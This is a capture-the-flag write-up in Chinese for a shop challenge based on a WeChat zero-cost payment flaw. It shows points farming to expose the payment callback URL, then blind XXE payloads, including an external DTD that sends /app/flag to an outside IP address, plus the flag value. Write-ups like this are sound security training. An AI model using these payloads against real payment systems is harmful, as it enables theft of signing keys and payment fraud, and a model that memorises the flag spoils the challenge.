# 解题过程
+ 注册一个正常的用户
+ 点开FLAG文件，点击购买，看到微信支付页面，获得提示：本题需要利用微信0元支付漏洞。该漏洞利用的前提是知道商城的回调URL,利用的核心为通过xxe获取商城的md5-key,用它伪造微信支付系统的支付结果通知消息，实现0元支付，为了降低题目难度，凸显题目中心，所以在本题中，只要成功利用回调url处的xxe就能拿到flag
+ 通过邀请薅羊毛刷积分,购买SECRET商品,获得商城微信支付的回调URL。由于回调URL是商城比较敏感的接口，所以我们采用了一定的保护措施，直接在浏览器中访问返回的界面为404，但是功能是存在的。
+ 出过题的选手应该知道系统运行的根目录为/app，猜测md5-key的文件名为key，通过xxe获得key，不过猜不到也没关系，题目中给出了提示，继续刷积分，购买商品HINT，获得key的路径及文件名：/app/flag。
+ base64解码获得的flag的值，获得flag明文。

# 详细步骤
+ 注册一个正常的用户
+ 刷够积分购买SECRET，获得回调URL:Details: http://ip:port/qwajsdfxjafioshqrwpieuz
+ 再重新注册一个用户，购买hint，猜到题目目标为获得/app/flag
+ 利用xxe获得key，由于回调URL处的XXE是没有回显的，所以需要用到XXE盲注。构造POST数据包，发送给回调URL。
    * POST数据包中的xml
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE a [ 
    <!ENTITY % d SYSTEM "http://your_vps_ip/evil.dtd">
    <!ENTITY % file SYSTEM "file:///app/flag">
    %d;%send; 
    ]>
    <c>&b;</c>
    ```

     * evil.dtd中的xml

    ```xml
    <!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://108.61.89.98/?%file;'>"> %all;
    ```

    * 查看vps中的apache访问日志，即可获得flag的内容：ZmxhZ3t4eHhzZGZzZGZzZGZ9
    * base64解码，获得flag。
